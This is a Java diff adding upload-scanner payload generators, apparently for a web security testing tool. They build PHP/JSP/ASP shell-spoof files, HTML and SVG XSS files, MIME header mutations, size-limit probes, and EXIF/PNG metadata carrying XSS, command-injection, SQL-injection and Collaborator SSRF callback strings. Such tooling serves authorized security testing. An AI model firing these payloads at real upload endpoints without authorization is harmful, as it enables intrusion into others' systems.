@@ -3,12 +3,20 @@ package com.littlespidy.uploadscanner.engine;
 import com.littlespidy.uploadscanner.model.PayloadDefinition;
 import com.littlespidy.uploadscanner.model.UploadScannerConfig;
 
+import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Base64;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
+import java.util.zip.CRC32;
 import java.util.zip.GZIPOutputStream;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
@@ -792,6 +800,19 @@ public class UploadPayloadGenerator {
             payloads.addAll(generateAllowedExtensionPayloads(config, baseFilename, token));
         }
 
+        // ══════════════════════════════════════════════════════════════════
+        // CATEGORY 7: VALIDATION, FILE SIZES & EXIF METADATA
+        // ══════════════════════════════════════════════════════════════════
+        if (config.isTestContentTypeValidation() || config.isTestMimeSpoofing()) {
+            payloads.addAll(generateContentTypePayloads(config, baseFilename, config.isTestSecListsWordlist(), token));
+        }
+        if (config.isTestFileSizeLimits()) {
+            payloads.addAll(generateFileSizePayloads(config, baseFilename, token));
+        }
+        if (config.isTestExifLeakage() || config.isTestExifXss() || config.isTestExifInjections()) {
+            payloads.addAll(generateExifPayloads(config, baseFilename, collab, token));
+        }
+
         return payloads;
     }
 
@@ -1470,5 +1491,669 @@ public class UploadPayloadGenerator {
                 0x00, 0x00, 0x00, 0x00,
                 0x00
         };
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // CATEGORY 7: VALIDATION, FILE SIZES & EXIF METADATA
+    // ══════════════════════════════════════════════════════════════════
+
+    public static List<PayloadDefinition> generateContentTypePayloadsOnly(UploadScannerConfig config, String baseFilename) {
+        long timestamp = System.currentTimeMillis();
+        String token = EXEC_TOKEN + timestamp;
+        // Standalone probe tests full SecLists wordlist by default
+        return generateContentTypePayloads(config, baseFilename, true, token);
+    }
+
+    public static List<PayloadDefinition> generateFileSizePayloadsOnly(UploadScannerConfig config, String baseFilename) {
+        long timestamp = System.currentTimeMillis();
+        String token = EXEC_TOKEN + timestamp;
+        return generateFileSizePayloads(config, baseFilename, token);
+    }
+
+    public static List<PayloadDefinition> generateExifPayloadsOnly(UploadScannerConfig config, String baseFilename, String collaboratorDomain) {
+        long timestamp = System.currentTimeMillis();
+        String token = EXEC_TOKEN + timestamp;
+        return generateExifPayloads(config, baseFilename, collaboratorDomain, token);
+    }
+
+    public static List<String> loadSecListsContentTypes() {
+        List<String> types = new ArrayList<>();
+        try (InputStream is = UploadPayloadGenerator.class.getResourceAsStream("/wordlists/web-all-content-types.txt")) {
+            if (is != null) {
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        line = line.trim();
+                        if (!line.isEmpty() && !line.startsWith("#")) {
+                            types.add(line);
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        if (types.isEmpty()) {
+            types.addAll(List.of(
+                    "application/octet-stream", "application/x-php", "application/x-httpd-php",
+                    "application/json", "application/xml", "text/html", "text/plain", "image/jpeg",
+                    "image/png", "image/gif", "image/svg+xml", "image/webp", "application/pdf",
+                    "application/javascript", "text/css", "multipart/form-data"
+            ));
+        }
+        return types;
+    }
+
+    public static List<PayloadDefinition> generateContentTypePayloads(UploadScannerConfig config,
+                                                                     String baseFilename,
+                                                                     boolean fullWordlist,
+                                                                     String token) {
+        List<PayloadDefinition> payloads = new ArrayList<>();
+        String category = "Content-Type";
+
+        // 1. SecLists Wordlist Probing
+        if (fullWordlist) {
+            List<String> wordlist = loadSecListsContentTypes();
+            for (String mime : wordlist) {
+                byte[] minimalContent = createMinimalJpeg();
+                payloads.add(new PayloadDefinition(
+                        "Content-Type: " + mime,
+                        category,
+                        "probe_mime.jpg",
+                        mime,
+                        minimalContent,
+                        token
+                ));
+            }
+        }
+
+        // 2. MIME Spoofing & Extension-MIME Mismatch
+        if (config.isTestMimeSpoofing()) {
+            // Executable scripts with innocent/image MIME types
+            String phpPayload = "<?php echo '" + token + "'; phpinfo(); ?>";
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: PHP Shell with image/jpeg",
+                    category,
+                    "shell_spoof.php",
+                    "image/jpeg",
+                    phpPayload,
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: PHP Shell with image/png",
+                    category,
+                    "shell_spoof.php",
+                    "image/png",
+                    phpPayload,
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: PHP Shell with application/octet-stream",
+                    category,
+                    "shell_spoof.php",
+                    "application/octet-stream",
+                    phpPayload,
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: PHP Shell with text/plain",
+                    category,
+                    "shell_spoof.php",
+                    "text/plain",
+                    phpPayload,
+                    token
+            ));
+
+            String jspPayload = "<% out.print(\"" + token + "\"); %>";
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: JSP Shell with image/png",
+                    category,
+                    "shell_spoof.jsp",
+                    "image/png",
+                    jspPayload,
+                    token
+            ));
+
+            String aspPayload = "<% Response.Write(\"" + token + "\") %>";
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: ASP Shell with image/jpeg",
+                    category,
+                    "shell_spoof.asp",
+                    "image/jpeg",
+                    aspPayload,
+                    token
+            ));
+
+            String htmlXss = "<!DOCTYPE html><html><body><script>alert('" + token + "')</script></body></html>";
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: HTML XSS with image/gif",
+                    category,
+                    "xss_spoof.html",
+                    "image/gif",
+                    htmlXss,
+                    token
+            ));
+
+            String svgXss = "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('" + token + "')\"></svg>";
+            payloads.add(new PayloadDefinition(
+                    "MIME Spoof: SVG XSS with image/png",
+                    category,
+                    "xss_spoof.svg",
+                    "image/png",
+                    svgXss,
+                    token
+            ));
+
+            // Image extension with dangerous MIME types
+            payloads.add(new PayloadDefinition(
+                    "MIME Mismatch: JPEG with application/x-php",
+                    category,
+                    "photo_mismatch.jpg",
+                    "application/x-php",
+                    createMinimalJpeg(),
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "MIME Mismatch: PNG with text/html",
+                    category,
+                    "avatar_mismatch.png",
+                    "text/html",
+                    createMinimalPng(),
+                    token
+            ));
+
+            // Header Mutation & Tampering
+            payloads.add(new PayloadDefinition(
+                    "Header Mutation: Empty Content-Type",
+                    category,
+                    "probe_empty_mime.jpg",
+                    "",
+                    createMinimalJpeg(),
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "Header Mutation: Semicolon Parameter Bypass",
+                    category,
+                    "probe_semi_mime.jpg",
+                    "image/jpeg; evil=application/x-php",
+                    createMinimalJpeg(),
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "Header Mutation: Mixed-Case Content-Type",
+                    category,
+                    "probe_case_mime.jpg",
+                    "ImAgE/jPeG",
+                    createMinimalJpeg(),
+                    token
+            ));
+            payloads.add(new PayloadDefinition(
+                    "Header Mutation: Binary Charset Parameter",
+                    category,
+                    "probe_charset_mime.jpg",
+                    "image/jpeg; charset=binary",
+                    createMinimalJpeg(),
+                    token
+            ));
+        }
+
+        return payloads;
+    }
+
+    public static List<PayloadDefinition> generateFileSizePayloads(UploadScannerConfig config,
+                                                                   String baseFilename,
+                                                                   String token) {
+        List<PayloadDefinition> payloads = new ArrayList<>();
+        String category = "File-Size";
+
+        // Step 1: 0 Bytes (Empty File)
+        payloads.add(new PayloadDefinition(
+                "File Size Limit: 0 Bytes (Empty File)",
+                category,
+                "size_probe_0B.jpg",
+                "image/jpeg",
+                new byte[0],
+                token
+        ));
+
+        // Step 2: Boundary increments up to max configured MB
+        int maxBytes = config.getMaxFileSizeMb() * 1024 * 1024;
+
+        int[] stepSizes = {
+                1024,                  // 1 KB
+                10 * 1024,             // 10 KB
+                100 * 1024,            // 100 KB
+                500 * 1024,            // 500 KB
+                1024 * 1024,           // 1 MB
+                2 * 1024 * 1024,       // 2 MB
+                5 * 1024 * 1024,       // 5 MB
+                10 * 1024 * 1024,      // 10 MB
+                20 * 1024 * 1024       // 20 MB
+        };
+
+        String[] stepLabels = {
+                "1 KB (1,024 B)",
+                "10 KB (10,240 B)",
+                "100 KB (102,400 B)",
+                "500 KB (512,000 B)",
+                "1 MB (1,048,576 B)",
+                "2 MB (2,097,152 B)",
+                "5 MB (5,242,880 B)",
+                "10 MB (10,485,760 B)",
+                "20 MB (20,971,520 B)"
+        };
+
+        for (int i = 0; i < stepSizes.length; i++) {
+            int size = stepSizes[i];
+            if (size > maxBytes && i > 0) {
+                break;
+            }
+            byte[] padded = createPaddedImage(size);
+            payloads.add(new PayloadDefinition(
+                    "File Size Limit: " + stepLabels[i],
+                    category,
+                    "size_probe_" + (size / 1024) + "K.jpg",
+                    "image/jpeg",
+                    padded,
+                    token
+            ));
+        }
+
+        return payloads;
+    }
+
+    public static List<PayloadDefinition> generateExifPayloads(UploadScannerConfig config,
+                                                              String baseFilename,
+                                                              String collaboratorDomain,
+                                                              String token) {
+        List<PayloadDefinition> payloads = new ArrayList<>();
+        String category = "EXIF";
+        String collab = (collaboratorDomain != null && !collaboratorDomain.trim().isEmpty())
+                ? collaboratorDomain.trim()
+                : "collab-test.burpcollaborator.net";
+
+        // 1. PII & GPS Metadata Leakage Probe (JPEG)
+        if (config.isTestExifLeakage()) {
+            Map<String, String> piiTags = new HashMap<>();
+            piiTags.put("Make", "LittleSpidy Phone 1.0");
+            piiTags.put("Model", "AuditProbe 1.0");
+            piiTags.put("Artist", "LittleSpidy Security Canary");
+            piiTags.put("Software", "UploadScanner_littlespidy");
+            piiTags.put("ImageDescription", "CANARY_EXIF_LEAK_TEST_" + token);
+
+            byte[] jpegPii = createJpegWithExif(piiTags, 37.7749, -122.4194);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Leakage: JPEG GPS & PII Canary",
+                    category,
+                    "exif_gps_canary.jpg",
+                    "image/jpeg",
+                    jpegPii,
+                    "CANARY_EXIF_LEAK_TEST_" + token
+            ));
+
+            // PNG tEXt Chunk PII Canary
+            Map<String, String> pngPii = new HashMap<>();
+            pngPii.put("Author", "LittleSpidy Security Canary");
+            pngPii.put("Comment", "GPS: 37.7749,-122.4194 canary " + token);
+            byte[] pngPiiBytes = createPngWithTextChunks(pngPii);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Leakage: PNG tEXt PII Canary",
+                    category,
+                    "exif_png_canary.png",
+                    "image/png",
+                    pngPiiBytes,
+                    token
+            ));
+        }
+
+        // 2. Stored EXIF XSS Probes
+        if (config.isTestExifXss()) {
+            String xssPayload = "\"><script>alert('EXIF_XSS_" + token + "')</script>";
+            Map<String, String> xssTags = new HashMap<>();
+            xssTags.put("Artist", xssPayload);
+            xssTags.put("ImageDescription", "<img src=x onerror=alert('EXIF_XSS_" + token + "')>");
+            byte[] jpegXss = createJpegWithExif(xssTags, Double.NaN, Double.NaN);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Stored XSS: JPEG Artist/Description Tags",
+                    category,
+                    "exif_xss.jpg",
+                    "image/jpeg",
+                    jpegXss,
+                    "EXIF_XSS_" + token
+            ));
+
+            Map<String, String> pngXssTags = new HashMap<>();
+            pngXssTags.put("Author", xssPayload);
+            pngXssTags.put("Description", xssPayload);
+            byte[] pngXss = createPngWithTextChunks(pngXssTags);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Stored XSS: PNG tEXt Author Tag",
+                    category,
+                    "exif_xss.png",
+                    "image/png",
+                    pngXss,
+                    "EXIF_XSS_" + token
+            ));
+        }
+
+        // 3. EXIF Injections (Command Injection & SQLi)
+        if (config.isTestExifInjections()) {
+            // Command Injection
+            String cmdPayload = "$(whoami);id;echo " + token;
+            Map<String, String> cmdTags = new HashMap<>();
+            cmdTags.put("Artist", cmdPayload);
+            cmdTags.put("Model", ";whoami;");
+            byte[] jpegCmd = createJpegWithExif(cmdTags, Double.NaN, Double.NaN);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Injection: Command Injection in EXIF Tags",
+                    category,
+                    "exif_cmd_inject.jpg",
+                    "image/jpeg",
+                    jpegCmd,
+                    token
+            ));
+
+            // SQL Injection
+            String sqliPayload = "' OR '1'='1' -- " + token;
+            Map<String, String> sqliTags = new HashMap<>();
+            sqliTags.put("Artist", sqliPayload);
+            sqliTags.put("ImageDescription", "admin' --");
+            byte[] jpegSqli = createJpegWithExif(sqliTags, Double.NaN, Double.NaN);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Injection: SQL Injection in EXIF Tags",
+                    category,
+                    "exif_sqli.jpg",
+                    "image/jpeg",
+                    jpegSqli,
+                    token
+            ));
+
+            // SSRF via Collaborator in EXIF
+            Map<String, String> ssrfTags = new HashMap<>();
+            ssrfTags.put("Artist", "http://" + collab + "/exif_artist");
+            ssrfTags.put("ImageDescription", "http://" + collab + "/exif_desc");
+            byte[] jpegSsrf = createJpegWithExif(ssrfTags, Double.NaN, Double.NaN);
+            payloads.add(new PayloadDefinition(
+                    "EXIF Injection: SSRF Callback in EXIF Tags",
+                    category,
+                    "exif_ssrf.jpg",
+                    "image/jpeg",
+                    jpegSsrf,
+                    collab
+            ));
+        }
+
+        return payloads;
+    }
+
+    public static byte[] createPaddedImage(int targetSizeBytes) {
+        if (targetSizeBytes <= 0) {
+            return new byte[0];
+        }
+        byte[] minimalJpeg = createMinimalJpeg();
+        if (targetSizeBytes <= minimalJpeg.length) {
+            return Arrays.copyOf(minimalJpeg, targetSizeBytes);
+        }
+        byte[] padded = new byte[targetSizeBytes];
+        // Copy everything except the last 2 bytes (EOI: FF D9)
+        System.arraycopy(minimalJpeg, 0, padded, 0, minimalJpeg.length - 2);
+        int paddingLen = targetSizeBytes - (minimalJpeg.length - 2) - 2;
+        int padStart = minimalJpeg.length - 2;
+        Arrays.fill(padded, padStart, padStart + paddingLen, (byte) 'A');
+        padded[targetSizeBytes - 2] = (byte) 0xFF;
+        padded[targetSizeBytes - 1] = (byte) 0xD9;
+        return padded;
+    }
+
+    public static byte[] createJpegWithExif(Map<String, String> asciiTags, double latitude, double longitude) {
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            // 1. SOI (FF D8)
+            out.write(new byte[] { (byte) 0xFF, (byte) 0xD8 });
+
+            // Prepare TIFF block
+            ByteArrayOutputStream tiffOut = new ByteArrayOutputStream();
+            // TIFF header: "II" (Intel Little-Endian), 0x002A, offset to IFD0 = 8
+            tiffOut.write(new byte[] { 0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00 });
+
+            // Supported tags in IFD0 in sorted order
+            List<Integer> tagIds = new ArrayList<>();
+            Map<Integer, byte[]> tagValues = new HashMap<>();
+
+            int[] candidateTags = { 0x010E, 0x010F, 0x0110, 0x0131, 0x013B };
+            String[] candidateKeys = { "ImageDescription", "Make", "Model", "Software", "Artist" };
+
+            for (int i = 0; i < candidateTags.length; i++) {
+                String val = asciiTags.get(candidateKeys[i]);
+                if (val != null) {
+                    tagIds.add(candidateTags[i]);
+                    byte[] bytes = (val + "\0").getBytes(StandardCharsets.UTF_8);
+                    tagValues.put(candidateTags[i], bytes);
+                }
+            }
+
+            boolean hasGps = !Double.isNaN(latitude) && !Double.isNaN(longitude);
+            if (hasGps) {
+                tagIds.add(0x8825); // GPS IFD pointer
+            }
+
+            int numIfd0 = tagIds.size();
+            int ifd0Size = 2 + (numIfd0 * 12) + 4;
+            int gpsIfdOffset = 8 + ifd0Size;
+            int numGps = 4;
+            int gpsIfdSize = hasGps ? (2 + (numGps * 12) + 4) : 0;
+
+            int currentDataOffset = 8 + ifd0Size + gpsIfdSize;
+
+            // Compute data offsets for tags
+            Map<Integer, Integer> tagOffsets = new HashMap<>();
+            for (int tagId : tagIds) {
+                if (tagId == 0x8825) {
+                    tagOffsets.put(tagId, gpsIfdOffset);
+                } else {
+                    byte[] b = tagValues.get(tagId);
+                    tagOffsets.put(tagId, currentDataOffset);
+                    currentDataOffset += b.length;
+                    if ((b.length % 2) != 0) currentDataOffset++;
+                }
+            }
+
+            int gpsLatDataOffset = currentDataOffset;
+            currentDataOffset += 24;
+            int gpsLonDataOffset = currentDataOffset;
+            currentDataOffset += 24;
+
+            // Write IFD0
+            writeShortLE(tiffOut, numIfd0);
+            for (int tagId : tagIds) {
+                if (tagId == 0x8825) {
+                    writeShortLE(tiffOut, 0x8825);
+                    writeShortLE(tiffOut, 4); // LONG
+                    writeIntLE(tiffOut, 1);
+                    writeIntLE(tiffOut, gpsIfdOffset);
+                } else {
+                    byte[] b = tagValues.get(tagId);
+                    writeShortLE(tiffOut, tagId);
+                    writeShortLE(tiffOut, 2); // ASCII
+                    writeIntLE(tiffOut, b.length);
+                    writeIntLE(tiffOut, tagOffsets.get(tagId));
+                }
+            }
+            writeIntLE(tiffOut, 0); // next IFD offset
+
+            // Write GPS IFD
+            if (hasGps) {
+                writeShortLE(tiffOut, 4);
+
+                // GPSLatitudeRef
+                writeShortLE(tiffOut, 0x0001);
+                writeShortLE(tiffOut, 2);
+                writeIntLE(tiffOut, 2);
+                tiffOut.write(latitude >= 0 ? 'N' : 'S');
+                tiffOut.write(0);
+                tiffOut.write(0);
+                tiffOut.write(0);
+
+                // GPSLatitude
+                writeShortLE(tiffOut, 0x0002);
+                writeShortLE(tiffOut, 5); // RATIONAL
+                writeIntLE(tiffOut, 3);
+                writeIntLE(tiffOut, gpsLatDataOffset);
+
+                // GPSLongitudeRef
+                writeShortLE(tiffOut, 0x0003);
+                writeShortLE(tiffOut, 2);
+                writeIntLE(tiffOut, 2);
+                tiffOut.write(longitude >= 0 ? 'E' : 'W');
+                tiffOut.write(0);
+                tiffOut.write(0);
+                tiffOut.write(0);
+
+                // GPSLongitude
+                writeShortLE(tiffOut, 0x0004);
+                writeShortLE(tiffOut, 5); // RATIONAL
+                writeIntLE(tiffOut, 3);
+                writeIntLE(tiffOut, gpsLonDataOffset);
+
+                writeIntLE(tiffOut, 0);
+            }
+
+            // Write IFD0 tag data values
+            for (int tagId : tagIds) {
+                if (tagId != 0x8825) {
+                    byte[] b = tagValues.get(tagId);
+                    tiffOut.write(b);
+                    if ((b.length % 2) != 0) tiffOut.write(0);
+                }
+            }
+
+            // Write GPS data rationals
+            if (hasGps) {
+                double absLat = Math.abs(latitude);
+                int latDeg = (int) absLat;
+                int latMin = (int) ((absLat - latDeg) * 60);
+                int latSec = (int) (Math.round(((absLat - latDeg) * 60 - latMin) * 60));
+
+                writeIntLE(tiffOut, latDeg); writeIntLE(tiffOut, 1);
+                writeIntLE(tiffOut, latMin); writeIntLE(tiffOut, 1);
+                writeIntLE(tiffOut, latSec); writeIntLE(tiffOut, 1);
+
+                double absLon = Math.abs(longitude);
+                int lonDeg = (int) absLon;
+                int lonMin = (int) ((absLon - lonDeg) * 60);
+                int lonSec = (int) (Math.round(((absLon - lonDeg) * 60 - lonMin) * 60));
+
+                writeIntLE(tiffOut, lonDeg); writeIntLE(tiffOut, 1);
+                writeIntLE(tiffOut, lonMin); writeIntLE(tiffOut, 1);
+                writeIntLE(tiffOut, lonSec); writeIntLE(tiffOut, 1);
+            }
+
+            byte[] tiffBytes = tiffOut.toByteArray();
+
+            // APP1 marker (FF E1)
+            out.write((byte) 0xFF);
+            out.write((byte) 0xE1);
+
+            int app1Len = 2 + 6 + tiffBytes.length;
+            out.write((app1Len >> 8) & 0xFF);
+            out.write(app1Len & 0xFF);
+
+            // "Exif\0\0"
+            out.write(new byte[] { 'E', 'x', 'i', 'f', 0x00, 0x00 });
+            out.write(tiffBytes);
+
+            // Minimal JPEG frame remainder (APP0 + EOI)
+            out.write(new byte[] {
+                    (byte) 0xFF, (byte) 0xE0, // APP0
+                    0x00, 0x10,
+                    0x4A, 0x46, 0x49, 0x46, 0x00,
+                    0x01, 0x01, 0x01,
+                    0x00, 0x48, 0x00, 0x48,
+                    0x00, 0x00,
+                    (byte) 0xFF, (byte) 0xD9 // EOI
+            });
+
+            return out.toByteArray();
+        } catch (Exception e) {
+            return createMinimalJpeg();
+        }
+    }
+
+    public static byte[] createPngWithTextChunks(Map<String, String> tags) {
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            // PNG signature
+            out.write(new byte[] { (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A });
+
+            // IHDR (1x1 pixel)
+            byte[] ihdrData = new byte[] {
+                    0x00, 0x00, 0x00, 0x01, // width 1
+                    0x00, 0x00, 0x00, 0x01, // height 1
+                    0x08, 0x06, 0x00, 0x00, 0x00 // 8-bit RGBA
+            };
+            writePngChunk(out, "IHDR", ihdrData);
+
+            // tEXt chunks
+            if (tags != null) {
+                for (Map.Entry<String, String> entry : tags.entrySet()) {
+                    String key = entry.getKey();
+                    String val = entry.getValue();
+                    if (key != null && val != null) {
+                        byte[] keyBytes = key.getBytes(StandardCharsets.ISO_8859_1);
+                        byte[] valBytes = val.getBytes(StandardCharsets.UTF_8);
+                        byte[] textData = new byte[keyBytes.length + 1 + valBytes.length];
+                        System.arraycopy(keyBytes, 0, textData, 0, keyBytes.length);
+                        textData[keyBytes.length] = 0;
+                        System.arraycopy(valBytes, 0, textData, keyBytes.length + 1, valBytes.length);
+                        writePngChunk(out, "tEXt", textData);
+                    }
+                }
+            }
+
+            // IDAT (minimal 1x1 image)
+            byte[] idatData = new byte[] {
+                    0x78, (byte) 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, (byte) 0xB4
+            };
+            writePngChunk(out, "IDAT", idatData);
+
+            // IEND
+            writePngChunk(out, "IEND", new byte[0]);
+
+            return out.toByteArray();
+        } catch (Exception e) {
+            return createMinimalPng();
+        }
+    }
+
+    private static void writePngChunk(OutputStream os, String type, byte[] data) throws IOException {
+        int length = data.length;
+        os.write((length >> 24) & 0xFF);
+        os.write((length >> 16) & 0xFF);
+        os.write((length >> 8) & 0xFF);
+        os.write(length & 0xFF);
+
+        byte[] typeBytes = type.getBytes(StandardCharsets.US_ASCII);
+        os.write(typeBytes);
+        os.write(data);
+
+        CRC32 crc = new CRC32();
+        crc.update(typeBytes);
+        crc.update(data);
+        long crcVal = crc.getValue();
+
+        os.write((int) ((crcVal >> 24) & 0xFF));
+        os.write((int) ((crcVal >> 16) & 0xFF));
+        os.write((int) ((crcVal >> 8) & 0xFF));
+        os.write((int) (crcVal & 0xFF));
+    }
+
+    private static void writeShortLE(OutputStream os, int val) throws IOException {
+        os.write(val & 0xFF);
+        os.write((val >> 8) & 0xFF);
+    }
+
+    private static void writeIntLE(OutputStream os, int val) throws IOException {
+        os.write(val & 0xFF);
+        os.write((val >> 8) & 0xFF);
+        os.write((val >> 16) & 0xFF);
+        os.write((val >> 24) & 0xFF);
     }
 }
